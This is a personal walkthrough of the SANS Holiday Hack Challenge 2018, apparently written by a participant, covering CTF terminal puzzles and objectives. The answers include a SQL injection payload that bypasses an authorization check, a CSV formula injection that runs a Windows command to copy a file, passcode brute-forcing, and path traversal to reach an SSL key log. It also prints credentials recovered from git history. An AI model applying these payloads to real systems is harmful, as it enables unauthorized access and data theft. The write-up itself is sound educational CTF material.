Go to the CFP website which is https://cfp.kringlecastle.com/cfp/cfp.html.

Navigate to https://cfp.kringlecastle.com/cfp/ to see directory listing.

```
../
cfp.html                                           08-Dec-2018 13:19                3391
rejected-talks.csv                                 08-Dec-2018 13:19               30677
```

And the answer is `John McClane`

```
talkCandidateId,request,payload,status,error,timeout,firstName,lastName,title,talkName,approveVotes,rejectVotes
qmt1,0,8040422,200,FALSE,FALSE,Banky,Orford,Marketing Coordinator,Kernel Introspection Spearphishing: Massively Multithreaded,4,8
qmt2,1,8040423,200,FALSE,FALSE,Sarah,Thibodeaux,Event Planner,Crypto or Containers: Abused for Fun and Proft,4,8
qmt3,2,8040424,200,FALSE,FALSE,John,McClane,Director of Security,Data Loss for Rainbow Teams: A Path in the Darkness,1,11
```

## Lethal ForensicELFication
Vim leaves files behind.

``` s
elf@d45108e2a925:~$ ls -alt
total 5460
drwxr-xr-x 1 elf  elf     4096 Dec 14 16:28 .
-rw-r--r-- 1 elf  elf     3540 Dec 14 16:28 .bashrc
drwxr-xr-x 1 elf  elf     4096 Dec 14 16:28 .secrets
drwxr-xr-x 1 root root    4096 Dec 14 16:28 ..
-rw-r--r-- 1 elf  elf      419 Dec 14 16:13 .bash_history
-rw-r--r-- 1 elf  elf     5063 Dec 14 16:13 .viminfo
-rwxr-xr-x 1 elf  elf  5551072 Dec 14 16:13 runtoanswer
-rw-r--r-- 1 elf  elf      220 May 15  2017 .bash_logout
-rw-r--r-- 1 elf  elf      675 May 15  2017 .profile
```

cat .viminfo

```
elf@d45108e2a925:~$ cat .viminfo 
# This viminfo file was generated by Vim 8.0.
# You may edit it if you're careful!
# Viminfo version
|1,4
# Value of 'encoding' when this file was written
*encoding=utf-8
# hlsearch on (H) or off (h):
~h
# Last Substitute Search Pattern:
~MSle0~&Elinore
# Last Substitute String:
$NEVERMORE
# Command Line History (newest to oldest):
:wq
|2,0,1536607231,,"wq"
:%s/Elinore/NEVERMORE/g
|2,0,1536607217,,"%s/Elinore/NEVERMORE/g"
:r .secrets/her/poem.txt
|2,0,1536607201,,"r .secrets/her/poem.txt"
:q
|2,0,1536606844,,"q"
:w
|2,0,1536606841,,"w"
:s/God/fates/gc
|2,0,1536606833,,"s/God/fates/gc"
:%s/studied/looking/g
|2,0,1536602549,,"%s/studied/looking/g"
|2,0,1536602549,,"%s/studied/looking/g"
:%s/sound/tenor/g
|2,0,1536600579,,"%s/sound/tenor/g"
:r .secrets/her/poem.txt
|2,0,1536600314,,"r .secrets/her/poem.txt"

# Search String History (newest to oldest):
? Elinore
|2,1,1536607217,,"Elinore"
? God
|2,1,1536606833,,"God"
? rousted
|2,1,1536605996,,"rousted"
? While
|2,1,1536604909,,"While"
? studied
|2,1,1536602549,,"studied"
? sound
|2,1,1536600579,,"sound"

# Expression History (newest to oldest):

# Input Line History (newest to oldest):

# Debug Line History (newest to oldest):

# Registers:
"1      LINE    0

|3,0,1,1,1,0,1536605034,""
""-     CHAR    0
        .
|3,1,36,0,1,0,1536606803,"."

# File marks:
'0  34  2  ~/.secrets/her/poem.txt
|4,48,34,2,1536607231,"~/.secrets/her/poem.txt"
...

# Jumplist (newest first):
-'  34  2  ~/.secrets/her/poem.txt
|4,39,34,2,1536607231,"~/.secrets/her/poem.txt"
...

# History of marks within files (newest to oldest):

> ~/.secrets/her/poem.txt
...
elf@d45108e2a925:~$ 
```

Is it `Elinore`? Look at the poem file at `/.secrets/her/poem.txt`

```
elf@d45108e2a925:~/.secrets/her$ cat poem.txt 
Once upon a sleigh so weary, Morcel scrubbed the grime so dreary,
Shining many a beautiful sleighbell bearing cheer and sound so pure--
  There he cleaned them, nearly napping, suddenly there came a tapping,
As of someone gently rapping, rapping at the sleigh house door.
"'Tis some caroler," he muttered, "tapping at my sleigh house door--
  Only this and nothing more."
Then, continued with more vigor, came the sound he didn't figure,
Could belong to one so lovely, walking 'bout the North Pole grounds.
  But the truth is, she WAS knocking, 'cause with him she would be talking,
Off with fingers interlocking, strolling out with love newfound?
Gazing into eyes so deeply, caring not who sees their rounds.
  Oh, 'twould make his heart resound!
Hurried, he, to greet the maiden, dropping rag and brush - unlaiden.
Floating over, more than walking, moving toward the sound still knocking,
  Pausing at the elf-length mirror, checked himself to study clearer,
Fixing hair and looking nearer, what a hunky elf - not shocking!
Peering through the peephole smiling, reaching forward and unlocking:
  NEVERMORE in tinsel stocking!
Greeting her with smile dashing, pearly-white incisors flashing,
Telling jokes to keep her laughing, soaring high upon the tidings,
  Of good fortune fates had borne him.  Offered her his dexter forelimb,
Never was his future less dim!  Should he now consider gliding--
No - they shouldn't but consider taking flight in sleigh and riding
  Up above the Pole abiding?
Smile, she did, when he suggested that their future surely rested,
Up in flight above their cohort flying high like ne'er before!
  So he harnessed two young reindeer, bold and fresh and bearing no fear.
In they jumped and seated so near, off they flew - broke through the door!
Up and up climbed team and humor, Morcel being so adored,
  By his lovely NEVERMORE!
-Morcel Nougat
```

Yes it is `Elinore`

```
elf@ae4da3afe93d:~$ runtoanswer Elinor
Loading, please wait......
Who was the poem written about? Elinor
Sorry, I don't think that's what the forensic data shows.
elf@ae4da3afe93d:~$ runtoanswer Elinore
Loading, please wait......
Who was the poem written about? Elinore
WWNXXK00OOkkxddoolllcc::;;;,,,'''.............                                 
WWNXXK00OOkkxddoolllcc::;;;,,,'''.............                                 
WWNXXK00OOkkxddoolllcc::;;;,,,'''.............                                 
WWNXXKK00OOOxddddollcccll:;,;:;,'...,,.....'',,''.    .......    .''''''       
WWNXXXKK0OOkxdxxxollcccoo:;,ccc:;...:;...,:;'...,:;.  ,,....,,.  ::'....       
WWNXXXKK0OOkxdxxxollcccoo:;,cc;::;..:;..,::...   ;:,  ,,.  .,,.  ::'...        
WWNXXXKK0OOkxdxxxollcccoo:;,cc,';:;':;..,::...   ,:;  ,,,',,'    ::,'''.       
WWNXXXK0OOkkxdxxxollcccoo:;,cc,'';:;:;..'::'..  .;:.  ,,.  ','   ::.           
WWNXXXKK00OOkdxxxddooccoo:;,cc,''.,::;....;:;,,;:,.   ,,.   ','  ::;;;;;       
WWNXXKK0OOkkxdddoollcc:::;;,,,'''...............                               
WWNXXK00OOkkxddoolllcc::;;;,,,'''.............                                 
WWNXXK00OOkkxddoolllcc::;;;,,,'''.............                                 
Thank you for solving this mystery, Slick.
Reading the .viminfo sure did the trick.
Leave it to me; I will handle the rest.
Thank you for giving this challenge your best.
-Tangle Coalbox
-ER Investigator
Congratulations!
```

## Door Passcode
Proxy the requests and see the symbols represent `0123`. Request is

```
https://doorpasscode.kringlecastle.com/checkpass.php?i=0123&resourceId=undefined
```

Bad response:

``` json
{"success":false,"message":"Incorrect guess."}
```

Do Burp Intruder to get the good response and passcode is `0120`.

``` json
{"success":true,"resourceId":"undefined","hash":"0273f6448d56b3aba69af76f99bdc741268244b7a187c18f855c6302ec93b703","message":"Correct guess!"}
```

Not sure what that hash it, it appears to be the hash of `resourceId`? So I guess we can trick the client into thinking it has opened the door? Or is it just a client side cehck?

# 3. de Bruijn Sequences

After going into the room we see Morcel saying `Welcome unprepared speaker!`

-----

# 4. Data Repo Analysis
git repo is at https://git.kringlecastle.com/Upatree/santas_castle_automation.

In the github repo there's a commit "removing accidental commit"

A file was removed with info

```
Hopefully this is the last time we have to change our password again until next Christmas. 
Password = 'Yippee-ki-yay'
Change ID = '9ed54617547cfca783e0f81f8dc5c927e3d1e3'
```

This can be used to open the file `santas_castle_automation/schematics/ventilation_diagram.zip`.

**This has plans for the Google ventilation thing near the Google booth in the lobby.**

It's for 1st and 2nd floor, there are more floors so I guess we can find the maps later.

## Stall Mucking Report
Complete this challenge by uploading the elf's report.txt
file to the samba share at //localhost/report-upload/

Use `ww` to disable truncating.

```
elf@145b364fd698:~$ ps auxww
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0  17952  2844 pts/0    Ss   19:38   0:00 /bin/bash /sbin/init
root        10  0.0  0.0  49532  3212 pts/0    S    19:38   0:00 sudo -u manager /home/man
ager/samba-wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argumen
t --do-not-run-as-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special --suppr
ess --suppress //localhost/report-upload/ directreindeerflatterystable -U report-upload
root        11  0.0  0.0  49532  3260 pts/0    S    19:38   0:00 sudo -E -u manager /usr/b
in/python /home/manager/report-check.py
root        15  0.0  0.0  45320  3116 pts/0    S    19:38   0:00 sudo -u elf /bin/bash
manager     16  0.0  0.0   9500  2568 pts/0    S    19:38   0:00 /bin/bash /home/manager/s
amba-wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argument --do
-not-run-as-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special --suppress --
suppress //localhost/report-upload/ directreindeerflatterystable -U report-upload
manager     17  0.0  0.0  33848  8048 pts/0    S    19:38   0:00 /usr/bin/python /home/man
ager/report-check.py
elf         18  0.0  0.0  18204  3224 pts/0    S    19:38   0:00 /bin/bash
manager     19  0.0  0.0   4196   708 pts/0    S    19:38   0:00 sleep 60
root        24  0.0  0.0 316664 15296 ?        Ss   19:38   0:00 /usr/sbin/smbd
root        25  0.0  0.0 308372  5684 ?        S    19:38   0:00 /usr/sbin/smbd
root        26  0.0  0.0 308364  4544 ?        S    19:38   0:00 /usr/sbin/smbd
root        28  0.0  0.0 316664  5908 ?        S    19:38   0:00 /usr/sbin/smbd
elf         30  0.0  0.0  36636  2760 pts/0    R+   19:39   0:00 ps auxww
```

Command is:

`smbclient //localhost/report-upload/ directreindeerflatterystable -U report-upload -c "put report.txt"`

```
elf@e248923eadbe:~$ 
WARNING: The "syslog" option is deprecated
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.5.12-Debian]
putting file report.txt as \report.txt (250.5 kb/s) (average 250.5 kb/s)
elf@e248923eadbe:~$ 
                                                                               
                               .;;;;;;;;;;;;;;;'                               
                             ,NWOkkkkkkkkkkkkkkNN;                             
                           ..KM; Stall Mucking ,MN..                           
                         OMNXNMd.             .oMWXXM0.                        
                        ;MO   l0NNNNNNNNNNNNNNN0o   xMc                        
                        :MO                         xMl             '.         
                        :MO   dOOOOOOOOOOOOOOOOOd.  xMl             :l:.       
 .cc::::::::;;;;;;;;;;;,oMO  .0NNNNNNNNNNNNNNNNN0.  xMd,,,,,,,,,,,,,clll:.     
 'kkkkxxxxxddddddoooooooxMO   ..'''''''''''.        xMkcccccccllllllllllooc.   
 'kkkkxxxxxddddddoooooooxMO  .MMMMMMMMMMMMMM,       xMkcccccccllllllllllooool  
 'kkkkxxxxxddddddoooooooxMO   '::::::::::::,        xMkcccccccllllllllllool,   
 .ooooollllllccccccccc::dMO                         xMx;;;;;::::::::lllll'     
                        :MO  .ONNNNNNNNXk           xMl             :lc'       
                        :MO   dOOOOOOOOOo           xMl             ;.         
                        :MO   'cccccccccccccc:'     xMl                        
                        :MO  .WMMMMMMMMMMMMMMMW.    xMl                        
                        :MO    ...............      xMl                        
                        .NWxddddddddddddddddddddddddNW'                        
                          ;ccccccccccccccccccccccccc;                          
                                                                               
You have found the credentials I just had forgot,
And in doing so you've saved me trouble untold.
Going forward we'll leave behind policies old,
Building separate accounts for each elf in the lot.
-Wunorse Openslae
```

-----

# 5. AD Privilege Discovery
Using the data set contained in this SANS Slingshot Linux image, find a reliable path from a Kerberoastable user to the Domain Admins group. What’s the user’s logon name? Remember to avoid RDP as a control path as it depends on separate local privilege escalation flaws. For hints on achieving this objective, please visit Holly Evergreen and help her with the CURLing Master Cranberry Pi terminal challenge.

https://download.holidayhackchallenge.com/HHC2018-DomainHack_2018-12-19.ova

## CURLing Master
Supposedly the trigger to start the "Candy Striper" is an "arcane HTTP/2 call."

Hint is the introduction to HTTP/2: https://developers.google.com/web/fundamentals/performance/http2/

Contents of `/etc/nginx/nginx.conf`

``` conf
elf@7ed57fd514a3:~$ cat /etc/nginx/nginx.conf 
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;

events {
        worker_connections 768;
        # multi_accept on;
}

http {

        sendfile on;
        tcp_nopush on;
        tcp_nodelay on;
        keepalive_timeout 65;
        types_hash_max_size 2048;
        # server_tokens off;

        # server_names_hash_bucket_size 64;
        # server_name_in_redirect off;

        include /etc/nginx/mime.types;
        default_type application/octet-stream;

        server {
        # love using the new stuff! -Bushy
                listen                  8080 http2;
                # server_name           localhost 127.0.0.1;
                root /var/www/html;

                location ~ [^/]\.php(/|$) {
                    fastcgi_split_path_info ^(.+?\.php)(/.*)$;
                    if (!-f $document_root$fastcgi_script_name) {
                        return 404;
                    }

                    # Mitigate https://httpoxy.org/ vulnerabilities
                    fastcgi_param HTTP_PROXY "";

                    # fastcgi_pass 127.0.0.1:9000;
                    fastcgi_pass unix:/var/run/php/php-fpm.sock;
                    fastcgi_index index.php;

                    # include the fastcgi_param setting
                    include fastcgi_params;
                    # SCRIPT_FILENAME parameter is used for PHP FPM determining
                    #  the script name. If it is not set in fastcgi_params file,
                    # i.e. /etc/nginx/fastcgi_params or in the parent contexts,
                    # please comment off following line:
                    # fastcgi_param  SCRIPT_FILENAME   $document_root$fastcgi_script_name;
                }
                }
        ##
        # Logging Settings
        ##
        access_log /var/log/nginx/access.log;
        error_log /var/log/nginx/error.log;
        ##
        # Gzip Settings
        ##
        gzip on;
        gzip_disable "msie6";
        # gzip_vary on;
        # gzip_proxied any;
        # gzip_comp_level 6;
        # gzip_buffers 16 8k;
        # gzip_http_version 1.1;
        # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;
        ##
        # Virtual Host Configs
        ##
        include /etc/nginx/conf.d/*.conf;
        include /etc/nginx/sites-enabled/*;
}
```

Looking at history (use the `up` arrow key), we get some commands including this:

```
curl --http2-prior-knowledge http://localhost:8080/index.php
```

Running the command gets us

``` html
<html>
 <head>
  <title>Candy Striper Turner-On'er</title>
 </head>
 <body>
 <p>To turn the machine on, simply POST to this URL with parameter "status=on"
 
 </body>
</html>
```

We can send this:

```
curl -d "status=on" -X POST http://localhost:8080/index.php --http2-prior-knowledge
```

``` html
$ curl -d "status=on" -X POST http://localhost:8080/index.php --http2-prior-knowledge
<html>
 <head>
  <title>Candy Striper Turner-On'er</title>
 </head>
 <body>
 <p>To turn the machine on, simply POST to this URL with parameter "status=on"
                                                                                
                                                                okkd,          
                                                               OXXXXX,         
                                                              oXXXXXXo         
                                                             ;XXXXXXX;         
                                                            ;KXXXXXXx          
                                                           oXXXXXXXO           
                                                        .lKXXXXXXX0.           
  ''''''       .''''''       .''''''       .:::;   ':okKXXXXXXXX0Oxcooddool,   
 'MMMMMO',,,,,;WMMMMM0',,,,,;WMMMMMK',,,,,,occccoOXXXXXXXXXXXXXxxXXXXXXXXXXX.  
 'MMMMN;,,,,,'0MMMMMW;,,,,,'OMMMMMW:,,,,,'kxcccc0XXXXXXXXXXXXXXxx0KKKKK000d;   
 'MMMMl,,,,,,oMMMMMMo,,,,,,lMMMMMMd,,,,,,cMxcccc0XXXXXXXXXXXXXXOdkO000KKKKK0x. 
 'MMMO',,,,,;WMMMMMO',,,,,,NMMMMMK',,,,,,XMxcccc0XXXXXXXXXXXXXXxxXXXXXXXXXXXX: 
 'MMN,,,,,,'OMMMMMW;,,,,,'kMMMMMW;,,,,,'xMMxcccc0XXXXXXXXXXXXKkkxxO00000OOx;.  
 'MMl,,,,,,lMMMMMMo,,,,,,cMMMMMMd,,,,,,:MMMxcccc0XXXXXXXXXXKOOkd0XXXXXXXXXXO.  
 'M0',,,,,;WMMMMM0',,,,,,NMMMMMK,,,,,,,XMMMxcccckXXXXXXXXXX0KXKxOKKKXXXXXXXk.  
 .c.......'cccccc.......'cccccc.......'cccc:ccc: .c0XXXXXXXXXX0xO0000000Oc     
                                                    ;xKXXXXXXX0xKXXXXXXXXK.    
                                                       ..,:ccllc:cccccc:'      
                                                                               
Unencrypted 2.0? He's such a silly guy.
That's the kind of stunt that makes my OWASP friends all cry.
Truth be told: most major sites are speaking 2.0;
TLS connections are in place when they do so.
-Holly Evergreen
<p>Congratulations! You've won and have successfully completed this challenge.
<p>POSTing data in HTTP/2.0.
 </body>
</html>
```

# Now the VM
Using the data set contained in this SANS Slingshot Linux image, find a reliable path from a Kerberoastable user to the Domain Admins group. What’s the user’s logon name? Remember to avoid RDP as a control path as it depends on separate local privilege escalation flaws. For hints on achieving this objective, please visit Holly Evergreen and help her with the CURLing Master Cranberry Pi terminal challenge.

https://download.holidayhackchallenge.com/HHC2018-DomainHack_2018-12-19.ova

Use Bloodhound, it's on desktop. There's a built-in query for getting to domain admin from Kerberoastable accounts.

Some of them need RDP which is not what we want but one stands out.

LDUBEJ00320@AD.KRINGLECASTLE.COM

-----

# 6. Badge Manipulation
Need to do the yule log analysis for hints?

## Yule Log Analysis

```
I am Pepper Minstix, and I'm looking for your help.
Bad guys have us tangled up in pepperminty kelp!
"Password spraying" is to blame for this our grinchly fate.
Should we blame our password policies which users hate?
Here you'll find a web log filled with failure and success.
One successful login there requires your redress.
Can you help us figure out which user was attacked?
Tell us who fell victim, and please handle this with tact...
  Submit the compromised webmail username to 
  runtoanswer to complete this challenge.
```

There's an `evtx` file and a python script to dump it as xml.

`python evtx_dump.py ho-ho-no.evtx > dumped`

And then I ran `cat dumped` and copied everything to a local text file here.

Supposedly they had done a password spray and then a successful login. We need to see those password sprays. If one of them successful in the spray then it should be a successful logon (`4624` event ID) in between a ton of unsuccessful logons (`4625`).

Searching for `4625` in the dumped file, we see the password spray clearly in VS Code.

**password spray 01 - picture**

Copy/paste that part to a new file and look for successful logins (`4624`). But we have multiple logins. Which one was the attacker?

We can see the attacker's IP address in failed logins for `4625` events. All of them seem to come from `172.31.254.101`.

We need a good login (`4624`) that happened from `172.31.254.101` in that file.

And we get this. Answer is `minty.candycane`.

``` xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}"></Provider>
<EventID Qualifiers="">4624</EventID>
<Version>2</Version>
<Level>0</Level>
<Task>12544</Task>
<Opcode>0</Opcode>
<Keywords>0x8020000000000000</Keywords>
<TimeCreated SystemTime="2018-09-10 13:05:03.702278"></TimeCreated>
<EventRecordID>240171</EventRecordID>
<Correlation ActivityID="{71a9b66f-4900-0001-a8b6-a9710049d401}" RelatedActivityID=""></Correlation>
<Execution ProcessID="664" ThreadID="15576"></Execution>
<Channel>Security</Channel>
<Computer>WIN-KCON-EXCH16.EM.KRINGLECON.COM</Computer>
<Security UserID=""></Security>
</System>
<EventData><Data Name="SubjectUserSid">S-1-5-18</Data>
<Data Name="SubjectUserName">WIN-KCON-EXCH16$</Data>
<Data Name="SubjectDomainName">EM.KRINGLECON</Data>
<Data Name="SubjectLogonId">0x00000000000003e7</Data>
<Data Name="TargetUserSid">S-1-5-21-25059752-1411454016-2901770228-1156</Data>
<Data Name="TargetUserName">minty.candycane</Data>
<Data Name="TargetDomainName">EM.KRINGLECON</Data>
<Data Name="TargetLogonId">0x000000000114a4fe</Data>
<Data Name="LogonType">8</Data>
<Data Name="LogonProcessName">Advapi  </Data>
<Data Name="AuthenticationPackageName">Negotiate</Data>
<Data Name="WorkstationName">WIN-KCON-EXCH16</Data>
<Data Name="LogonGuid">{d1a830e3-d804-588d-aea1-48b8610c3cc1}</Data>
<Data Name="TransmittedServices">-</Data>
<Data Name="LmPackageName">-</Data>
<Data Name="KeyLength">0</Data>
<Data Name="ProcessId">0x00000000000019f0</Data>
<Data Name="ProcessName">C:\Windows\System32\inetsrv\w3wp.exe</Data>
<Data Name="IpAddress">172.31.254.101</Data>
<Data Name="IpPort">38283</Data>
<Data Name="ImpersonationLevel">%%1833</Data>
<Data Name="RestrictedAdminMode">-</Data>
<Data Name="TargetOutboundUserName">-</Data>
<Data Name="TargetOutboundDomainName">-</Data>
<Data Name="VirtualAccount">%%1843</Data>
<Data Name="TargetLinkedLogonId">0x0000000000000000</Data>
<Data Name="ElevatedToken">%%1842</Data>
</EventData>
</Event>
```

## scan-o-matic
Upload QRcode with payload to do SQLi.

This is what the request looks like:

```
POST /upload HTTP/1.1
Host: scanomatic.kringlecastle.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://scanomatic.kringlecastle.com/index.html
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 16
Connection: close
Cookie: resource_id=false

b64barcode=ddddd
```

This results in an exception that is part of the challenge:

```
HTTP/1.1 200 OK
Server: nginx/1.10.3
Date: Sun, 30 Dec 2018 04:32:50 GMT
Content-Type: application/json
Content-Length: 151
Connection: close

{"data":"EXCEPTION AT (LINE 135 \"temp_file.write(base64.b64decode(request.form['b64barcode'].split(',')[-1]))\"): Incorrect padding","request":false}
```

Now we if upload a QRcode with payload `hello'`, we get this response:

```
HTTP/1.1 200 OK
Server: nginx/1.10.3
Date: Sun, 30 Dec 2018 04:32:28 GMT
Content-Type: application/json
Content-Length: 363
Connection: close

{"data":"EXCEPTION AT (LINE 96 \"user_info = query(\"SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = '{}' LIMIT 1\".format(uid))\"): (1064, u\"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''hello'' LIMIT 1' at line 1\")","request":false}
```

We can learn a few things:

* It's running MariaDB.
* Original SQL query is
  * `SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = '{}' LIMIT 1"`
* Payload is injected in the value of `uid`.
* If the format of the query is correct, we get these responses
  * `{"data":"Authorized User Account Has Been Disabled!","request":false}`
  * `{"data":"No Authorized User Account Found!","request":false}` I got this for `hello' or '1'='1 -- ;`.
* Remember to pass a whitespace and a char after the comment for MariaDB to count it as a comment.

### Payload

3.png: `hello' OR '1'='1 -- ;`
4.png: `hello' OR 1=1 -- ;`
5.png: `hello' AND enabled = 1 OR 1=1 -- ;`
6.png: `hello' AND enabled = true OR 1=1 -- ; ` (1 and 0 are aliases for true and false in MariaDB)

Correct payload is `' OR enabled = 1 -- ;`

`SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = '' OR enabled = 1 -- ; ' LIMIT 1`

Response is

``` json
{"data":"User Access Granted - Control number 19880715","request":true,"success":{"hash":"ff60055a84873cd7d75ce86cfaebd971ab90c86ff72d976ede0f5f04795e99eb","resourceId":"false"}}
```

Answer is `19880715`. And we are in Santa's secret room.

# 7. HR Incident Response
Santa uses an Elf Resources website to look for talented information security professionals. Gain access to the website and fetch the document C:\candidate_evaluation.docx. Which terrorist organization is secretly supported by the job applicant whose name begins with "K." For hints on achieving this objective, please visit Sparkle Redberry and help her with the Dev Ops Fail Cranberry Pi terminal challenge.

Website is https://careers.kringlecastle.com/.

## Dev Ops Fail

```
Coalbox again, and I've got one more ask.
Sparkle Q. Redberry has fumbled a task.
Git pull and merging, she did all the day;
With all this gitting, some creds got away.
Urging - I scolded, "Don't put creds in git!"
She said, "Don't worry - you're having a fit.
If I did drop them then surely I could,
Upload some new code done up as one should."
Though I would like to believe this here elf,
I'm worried we've put some creds on a shelf.
Any who's curious might find our "oops,"
Please find it fast before some other snoops!

Find Sparkle's password, then run the runtoanswer tool.
```

Go inside `kcconfmgmt` and see it's a git repo. Apparently she put user/pass in the git repo and overwrote it and we need to find it.

```
elf@03a47cb7373b:~/kcconfmgmt$ ls -alt
total 72
drwxr-xr-x 1 elf elf  4096 Dec 14 16:30 ..
drwxr-xr-x 1 elf elf  4096 Nov 14 09:48 .
drwxr-xr-x 1 elf elf  4096 Nov 14 09:48 .git
-rw-r--r-- 1 elf elf   537 Nov 14 09:48 package.json
drwxr-xr-x 1 elf elf  4096 Nov 14 09:47 server
-rw-r--r-- 1 elf elf 31003 Nov 14 09:46 package-lock.json
-rw-r--r-- 1 elf elf  1074 Nov  3 20:28 app.js
drwxr-xr-x 1 elf elf  4096 Nov  2 15:05 public
drwxr-xr-x 1 elf elf  4096 Nov  2 15:05 routes
drwxr-xr-x 1 elf elf  4096 Nov  2 15:05 views
-rw-r--r-- 1 elf elf    66 Nov  1 15:30 README.md
```

Either `grep -ir password` or do `git log -10` to see the last 10 commit messages.

One of the commit messages is

```
commit 60a2ffea7520ee980a5fc60177ff4d0633f2516b
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Thu Nov 8 21:11:03 2018 -0500
    Per @tcoalbox admonishment, removed username/password from config.js, default settings
 in config.js.def need to be updated before use

commit b2376f4a93ca1889ba7d947c2d14be9a5d138802
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Thu Nov 8 13:25:32 2018 -0500
    Add passport module
```

So it was in `config.js`. It has been replaced by `config.js.def`.

``` js
elf@03a47cb7373b:~/kcconfmgmt/server/config$ cat config.js.def 
// Database URL
module.exports = {
    'url' : 'mongodb://username:password@127.0.0.1:27017/node-api'
};
```

But instead of going around and trying to figure out the stuff in the `.git` directory, we can just revert to the commit BEFORE THAT and then look inside that file.

`git checkout b2376f4a`

Now we can see inside `config.js`:

``` js
elf@03a47cb7373b:~/kcconfmgmt/server/config$ cat config.js 
// Database URL
module.exports = {
    'url' : 'mongodb://sredberry:twinkletwinkletwinkle@127.0.0.1:27017/node-api'
};
```

Answer is `twinkletwinkletwinkle`.

```
elf@cb4b2e9db7f3:~$ runtoanswer twinkletwinkletwinkle
Loading, please wait......

Enter Sparkle Redberry's password: twinkletwinkletwinkle

This ain't "I told you so" time, but it's true:
I shake my head at the goofs we go through.
Everyone knows that the gits aren't the place;
Store your credentials in some safer space.

Congratulations!
```

## https://careers.kringlecastle.com/
Santa uses an Elf Resources website to look for talented information security professionals. Gain access to the website and fetch the document C:\candidate_evaluation.docx. Which terrorist organization is secretly supported by the job applicant whose name begins with "K." For hints on achieving this objective, please visit Sparkle Redberry and help her with the Dev Ops Fail Cranberry Pi terminal challenge.

Seems like we can inject payloads through CSVs to get the file. Apparently the OWASP payloads work.

### CSV Injection Talk

* Youtube: https://www.youtube.com/watch?v=Z3qpcKVv2Bg

This is on 404 page

```
Publicly accessible file served from:
C:\careerportal\resources\public\ not found......

Try:
https://careers.kringlecastle.com/public/'file name you are looking for'
```

So we need to copy the file to that place and then access it.

111,=CMD|'/c copy C:\candidate_evaluation.docx C:\careerportal\resources\public\myfile.txt'!A1,33
55,44,77

Now can access the file at `https://careers.kringlecastle.com/public/myfile.txt`, change the extension and view it.

Answer is `Fancy Beaver`.

-----

# 8. Network Traffic Forensics
Santa has introduced a web-based packet capture and analysis tool at https://packalyzer.kringlecastle.com to support the elves and their information security work. Using the system, access and decrypt HTTP/2 network activity. What is the name of the song described in the document sent from Holly Evergreen to Alabaster Snowball? For hints on achieving this objective, please visit SugarPlum Mary and help her with the Python Escape from LA Cranberry Pi terminal challenge.

Hint from challenge

```
Yay, you did it! You escaped from the Python!

As a token of my gratitude, I would like to share a rumor I had heard about Santa's new web-based packet analyzer - Packalyzer.

Another elf told me that Packalyzer was rushed and deployed with development code sitting in the web root.

https://packalyzer.kringlecastle.com/

Apparently, he found this out by looking at HTML comments left behind and was able to grab the server-side source code.

There was suspicious-looking development code using environment variables to store SSL keys and open up directories.

This elf then told me that manipulating values in the URL gave back weird and descriptive errors.

I'm hoping these errors can't be used to compromise SSL on the website and steal logins.

On a tooootally unrelated note, have you seen the HTTP2 talk at at KringleCon by the Chrises? I never knew HTTP2 was so different!
```

Make an account an login. Then we can sniff traffic and upload pcaps for analysis. In `Captures` we can download/reanalyze/delete older pcaps. We can use this to do directory traversal.

```
https://packalyzer.kringlecastle.com/uploads/nem,.rxr


Error: ENOENT: no such file or directory, open '/opt/http2/uploads//nem,.rxr'
```

We want to look for server-side code, according to the hints they are at `web root`

There's also comments refering to `app.js`

`//File upload Function. All extensions and sizes are validated server-side in app.js`

POST request for upload goes to `/api/list` but everything inside `/api` is unauthorized.

It's under `pub`

https://packalyzer.kringlecastle.com/pub/app.js


Inside `app.js` we can see paths to the keys?

``` js
const dev_mode = true;
const key_log_path = ( !dev_mode || __dirname + process.env.DEV + process.env.SSLKEYLOGFILE )
const options = {
  key: fs.readFileSync(__dirname + '/keys/server.key'),
  cert: fs.readFileSync(__dirname + '/keys/server.crt'),
  http2: {
    protocol: 'h2',         // HTTP2 only. NOT HTTP1 or HTTP1.1
    protocols: [ 'h2' ],
  },
  keylog : key_log_path     //used for dev mode to view traffic. Stores a few minutes worth at a time
```

`dev_mode` is on so it should be in those places?


`__dirname` is the current directory of the module.


From https://nodejs.org/docs/latest/api/modules.html#modules_dirname

``` js
The directory name of the current module. This is the same as the path.dirname() of the __filename.

Example: running node example.js from /Users/mjr

console.log(__dirname);
// Prints: /Users/mjr
console.log(path.dirname(__filename));
// Prints: /Users/mjr
```

Look at `load_envs`, they are opening up directories based on names of environmental variables.

``` js
function load_envs() {
  var dirs = []
  var env_keys = Object.keys(process.env)
  for (var i=0; i < env_keys.length; i++) {
    if (typeof process.env[env_keys[i]] === "string" ) {
      dirs.push(( "/"+env_keys[i].toLowerCase()+'/*') )
    }
  }
  return uniqueArray(dirs)
}
if (dev_mode) {
    //Can set env variable to open up directories during dev
    const env_dirs = load_envs();
} else {
    const env_dirs = ['/pub/','/uploads/'];
}
```

So if we navigate to https://packalyzer.kringlecastle.com/SSLKEYLOGFILE/ we will get

`Error: ENOENT: no such file or directory, open '/opt/http2packalyzer_clientrandom_ssl.log/'`

